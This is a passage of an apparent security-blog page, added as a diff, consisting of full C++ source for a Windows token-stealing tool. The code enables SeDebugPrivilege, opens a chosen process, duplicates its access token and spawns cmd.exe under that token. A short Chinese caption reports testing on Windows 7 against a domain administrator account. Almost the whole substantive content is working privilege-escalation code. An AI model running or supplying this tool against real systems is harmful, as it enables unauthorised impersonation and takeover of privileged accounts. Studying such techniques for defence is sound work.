+<pre><code class="language-纯文本">#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+
+//Only administrator can get debug priv
+BOOL GetDebugPriv() {
+  HANDLE Token;
+  TOKEN_PRIVILEGES tp;
+  LUID Luid;
+  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) {
+    std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+    return false;
+  }
+
+  tp.PrivilegeCount = 1;
+  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+  if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) {
+    std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+    return false;
+  }
+  tp.Privileges[0].Luid = Luid;
+  if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) ){
+    std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+    return false;
+  }
+  if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+    return false;
+  }
+  else {
+    return true;
+  }
+}
+
+
+
+int main(int argc, char* argv[]) {
+  HANDLE t_process;
+  HANDLE token = NULL;
+  HANDLE token_bak = NULL;
+  DWORD process_id;
+  sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id);
+  WCHAR command[] = L&quot;C:\\Windows\\System32\\cmd.exe&quot;;
+  STARTUPINFO startupInfo;
+  PROCESS_INFORMATION processInformation;
+  ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO));
+  ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION));
+  startupInfo.cb = sizeof(STARTUPINFO);
+  std::cout &lt;&lt; argv[1] &lt;&lt; std::endl;
+  std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl;
+  if (GetDebugPriv()== TRUE) {
+    std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl;
+  }
+  else {
+    std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl;
+  }
+  system(&quot;whoami /priv&quot;);
+  t_process = OpenProcess(PROCESS_ALL_ACCESS, true, process_id);
+  if (!t_process) {
+    std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+  if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) {
+    std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+
+  if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) {
+    std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+  if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) {
+    std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+  return 0;
+}
+</code></pre>
+<p><img alt="QQ截图20210217144620" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217144620.png" title="QQ截图20210217144620" /></p>
+<p>这是在win7下的测试结果 const\administrator 是域控</p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.efa0ade1.min.js"></script>
+      
+    
+  </body>
+</html>
